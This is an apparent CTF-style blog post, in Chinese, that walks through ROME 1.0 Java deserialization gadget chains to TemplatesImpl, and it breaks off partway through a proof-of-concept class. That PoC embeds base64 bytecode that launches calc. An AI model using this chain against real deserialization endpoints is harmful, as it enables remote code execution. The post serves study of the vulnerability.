@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=5"
+    />
+    <meta name="description" content="引入与版本条件 版本(无再重述的)  123456789&#x2F;** * rome 1.0 * jdk: jdk7u21(复现非要求) *&#x2F;&lt;dependency&gt;    &lt;groupId&gt;rome&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;rome&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.0&lt;&#x2F;vers">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全5(14)_rome">
+<meta property="og:url" content="https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="引入与版本条件 版本(无再重述的)  123456789&#x2F;** * rome 1.0 * jdk: jdk7u21(复现非要求) *&#x2F;&lt;dependency&gt;    &lt;groupId&gt;rome&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;rome&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.0&lt;&#x2F;vers">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-11-24T14:07:19.888Z">
+<meta property="article:modified_time" content="2024-11-25T03:55:13.485Z">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="java反序列化">
+<meta name="twitter:card" content="summary">    
+    <link
+        rel="shortcut icon"
+        href="/images/favicon.ico"
+    />
+       
+    <link
+        rel="icon"
+        type="image/png"
+        href="/images/favicon-192x192.png"
+        sizes="192x192"
+    />
+       
+    <link
+        rel="apple-touch-icon"
+        sizes="180x180"
+        href="/images/apple-touch-icon.png"
+    />
+      
+    <!-- title -->
+    <title>Java安全5(14)_rome</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z6JGRC9FT2"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-Z6JGRC9FT2');
+  </script>
+
+ <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+     
+    <!-- mathjax -->
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/25/windows%E5%8D%8A%E5%85%A8%E9%94%AE%E7%9B%98%E9%85%8D%E7%BD%AE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/23/Java%E5%AE%89%E5%85%A85(13)_shiro550/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&text=Java安全5(14)_rome"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&title=Java安全5(14)_rome"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&is_video=false&description=Java安全5(14)_rome"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java安全5(14)_rome&body=Check out this article: https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&title=Java安全5(14)_rome"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&title=Java安全5(14)_rome"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&title=Java安全5(14)_rome"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&title=Java安全5(14)_rome"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&name=Java安全5(14)_rome&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&t=Java安全5(14)_rome"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E5%85%A5%E4%B8%8E%E7%89%88%E6%9C%AC%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text">引入与版本条件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number"></span> <span class="toc-text">HashMap利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap-Gadget-CB1"><span class="toc-number">1.</span> <span class="toc-text">HashMap Gadget: ?+CB1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E7%82%B9-ToStringBean-toString-String"><span class="toc-number">2.</span> <span class="toc-text">敏感点: ToStringBean.toString(String)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ObjectBean"><span class="toc-number">3.</span> <span class="toc-text">ObjectBean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap-poc"><span class="toc-number">4.</span> <span class="toc-text">HashMap poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashTable%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number"></span> <span class="toc-text">HashTable利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HashTable-Gadget-CC7-%E4%BD%86%E6%98%AF%E4%B8%8D%E7%94%A8CC%E5%BA%93"><span class="toc-number">1.</span> <span class="toc-text">HashTable Gadget: CC7 + ?(但是不用CC库)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashTable-reconstitutionPut"><span class="toc-number">2.</span> <span class="toc-text">HashTable.reconstitutionPut()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashtable-poc"><span class="toc-number">3.</span> <span class="toc-text">Hashtable poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BadAttributeValueExpException%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number"></span> <span class="toc-text">BadAttributeValueExpException利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-%E6%B2%A1%E6%9C%89ObjectBean%E4%BA%86-%E4%BD%93%E9%87%8F%E5%B0%8F%E4%B8%80%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">Gadget: 没有ObjectBean了(体量小一点)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BadAttributeValueExpException-readObject"><span class="toc-number">2.</span> <span class="toc-text">BadAttributeValueExpException.readObject()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EqualsBean%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number"></span> <span class="toc-text">EqualsBean利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EqualsBean-Gadget"><span class="toc-number">1.</span> <span class="toc-text">EqualsBean Gadget</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number"></span> <span class="toc-text">Ref</span></a>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Java安全5(14)_rome
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-24T14:07:19.888Z" class="dt-published" itemprop="datePublished">2024-11-24</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a>, <a class="p-category" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">java反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="引入与版本条件"><a href="#引入与版本条件" class="headerlink" title="引入与版本条件"></a>引入与版本条件</h3><ol>
+<li><p>版本(无再重述的)</p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * rome 1.0</span></span><br><span class="line"><span class="comment"> * jdk: jdk7u21(复现非要求)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;rome&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;rome&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>敏感点</strong>都是再ToStringBean.toString(String)这个地方，这一篇的不同链只是到达方式不同</p>
+</li>
+</ol>
+<h2 id="HashMap利用链"><a href="#HashMap利用链" class="headerlink" title="HashMap利用链"></a>HashMap利用链</h2><h3 id="HashMap-Gadget-CB1"><a href="#HashMap-Gadget-CB1" class="headerlink" title="HashMap Gadget: ?+CB1"></a>HashMap Gadget: ?+CB1</h3><ol>
+<li><p>见下</p>
+<ol>
+<li>顺着看的时候突然发现其实找链子是从最终的执行点出发，但是中间是可以有源-&gt;终的小推测的(可以放飞想象力，期间的思维还是要偏向执行点)，主要还是从后向前</li>
+<li>这里的toString是在TiedMapEntry(CC库中的)之后的又一调用toString()方法的链子</li>
+<li>小小总结一下执行点<ol>
+<li>方法调用</li>
+<li>getter</li>
+</ol>
+</li>
+</ol>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br><span class="line">    HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">        ObjectBean.hashCode()</span><br><span class="line">            EqualsBean.beanHashCode()</span><br><span class="line">                ObjectBean.toString()   <span class="comment">// 容易想到CC5，但是原理是不同，CC5基于CC</span></span><br><span class="line">                    ToStringBean.toString()</span><br><span class="line">                        ToStringBean.toString(String)</span><br><span class="line">                            Method.invoke(Object, Object...)</span><br><span class="line">                                DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">                                    NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">                                        NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">                                            TemplatesImpl.getOutputProperties() <span class="comment">// 一下就是CB1的链子了</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="敏感点-ToStringBean-toString-String"><a href="#敏感点-ToStringBean-toString-String" class="headerlink" title="敏感点: ToStringBean.toString(String)"></a>敏感点: ToStringBean.toString(String)</h3><ol>
+<li><p>来到<code>ToStringBean.toString(String)</code>，可以看到这里有无参getter的调用</p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">toString</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass);</span><br><span class="line">        <span class="keyword">if</span> (pds!=<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;pds.length;i++) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">pName</span> <span class="operator">=</span> pds[i].getName();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">pReadMethod</span> <span class="operator">=</span> pds[i].getReadMethod();</span><br><span class="line">                <span class="keyword">if</span> (pReadMethod!=<span class="literal">null</span> &amp;&amp;                             <span class="comment">// ensure it has a getter method</span></span><br><span class="line">                    pReadMethod.getDeclaringClass()!=Object.class &amp;&amp; <span class="comment">// filter Object.class getter methods</span></span><br><span class="line">                    pReadMethod.getParameterTypes().length==<span class="number">0</span>) &#123;     <span class="comment">// filter getter methods that take parameters</span></span><br><span class="line">                    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> pReadMethod.invoke(_obj,NO_PARAMS);</span><br><span class="line">                    printProperty(sb,prefix+<span class="string">&quot;.&quot;</span>+pName,value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        sb.append(<span class="string">&quot;\n\nEXCEPTION: Could not complete &quot;</span>+_obj.getClass()+<span class="string">&quot;.toString(): &quot;</span>+ex.getMessage()+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查查当前文件有无调用这个toString()的，有！接下来该文件中没有调用toString()的了，那就找一个可以设置是ToStringBean的对象调用toString()？<strong>将问题进一步转化</strong></p>
+</li>
+</ol>
+<h3 id="ObjectBean"><a href="#ObjectBean" class="headerlink" title="ObjectBean"></a>ObjectBean</h3><ol>
+<li><p>观察这个类先，内部还包含了3个bean</p>
+<ol>
+<li>再注意到hashCode()方法</li>
+</ol>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectBean</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>, Cloneable &#123;</span><br><span class="line">    <span class="keyword">private</span> EqualsBean _equalsBean;</span><br><span class="line">    <span class="keyword">private</span> ToStringBean _toStringBean;</span><br><span class="line">    <span class="keyword">private</span> CloneableBean _cloneableBean;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> _equalsBean.beanHashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>进入到EqualsBean.beanHashCode()方法</p>
+<ol>
+<li>这里看到有一个toString()，并且_obj可控（反射），符合和上述的要求</li>
+</ol>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EqualsBean</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[] NO_PARAMS = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Class _beanClass;</span><br><span class="line">    <span class="keyword">private</span> Object _obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">beanHashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> _obj.toString().hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="HashMap-poc"><a href="#HashMap-poc" class="headerlink" title="HashMap poc"></a>HashMap poc</h3><ol>
+<li>先要解决构造条件: 先过一遍再开始细，有些有呼应<ol>
+<li>HashMap中放入一个ObejectBean</li>
+<li>ObejectBean中的_equalsBean(是一个EqualsBean)，的EqualsBean的_obj设置为ToStringBean(这里hashCode调用_obj.toString())</li>
+<li>将ToString对象的_obj的_beanClass设置为Templates.class(会获取其中的getOutput…敏感方法)</li>
+<li>最后将ToString对象的_obj设置为我们恶意的TemplatesImpl对象就好了</li>
+</ol>
+</li>
+<li>romePox<ol>
+<li>这里想用javassist发现用的是jdk7u21就直接base64了</li>
+</ol>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// romePoc.java</span></span><br><span class="line"><span class="keyword">package</span> rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="comment">// import javassist.ClassPool;</span></span><br><span class="line"><span class="comment">// import javassist.CtClass;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">romePoc</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 1. 恶意TemplatesImpl对象 * * * * * */</span></span><br><span class="line">            <span class="comment">// ClassPool pool = ClassPool.getDefault();</span></span><br><span class="line">            <span class="comment">// CtClass clazz_evil = pool.get(Evil.class.getName());</span></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">payload_obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            <span class="comment">// setFieldValue(payload_obj, &quot;_bytecodes&quot;, clazz_evil.toBytecode());</span></span><br><span class="line">            <span class="comment">// javac Evil.java &amp;&amp; cat Evil.class | base64 -w 0</span></span><br><span class="line">            setFieldValue(payload_obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123; Base64.decode(<span class="string">&quot;yv66vgAAADMALwoACQAWCQAXABgIABkKABoAGwoAHAAdCAAeCgAcAB8HACAHACEBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb&quot;</span>+</span><br><span class="line">                                                                            <span class="string">&quot;20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAIgEApihMY2&quot;</span>+</span><br><span class="line">                                                                            <span class="string">&quot;9tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGF&quot;</span>+</span><br><span class="line">                                                                            <span class="string">&quot;jaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAY8aW5pdD4BAAMoKVYHACMBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhDAARABIHACQMACUAJgEAEUhl&quot;</span>+</span><br><span class="line">                                                                            <span class="string">&quot;bGxvIGZyb20gS0MxenM0BwAnDAAoACkHACoMACsALAEABGNhbGMMAC0ALgEACXJvbWUvRXZpbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyY&quot;</span>+</span><br><span class="line">                                                                            <span class="string">&quot;WN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQ&quot;</span>+</span><br><span class="line">                                                                            <span class="string">&quot;EAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXR&quot;</span>+</span><br><span class="line">                                                                            <span class="string">&quot;SdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAgACQAAAAAAAwABAAoACwACAAwAAAAZAAAAAwAA&quot;</span>+</span><br><span class="line">                                                                            <span class="string">&quot;AAGxAAAAAQANAAAABgABAAAADAAOAAAABAABAA8AAQAKABAAAgAMAAAAGQAAAAQAAAABsQAAAAEADQAAAAYAAQAAAA4ADgAAAAQAAQAPAAEAEQASAAIADAAAADoAAgABAAAAFiq3AAGyAAISA7YABLgABRIGtgAHV7EAAAABAA0AAAASAAQAAAARAAQAEgAMABMAFQAUAA4AAAAEAAEAEwABABQAAAACABU=&quot;</span>)&#125;);</span><br><span class="line">            setFieldValue(payload_obj,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;KC1zs4&quot;</span>);</span><br><span class="line">            setFieldValue(payload_obj,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. 设置触发 * * * * * */</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">triggeredObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 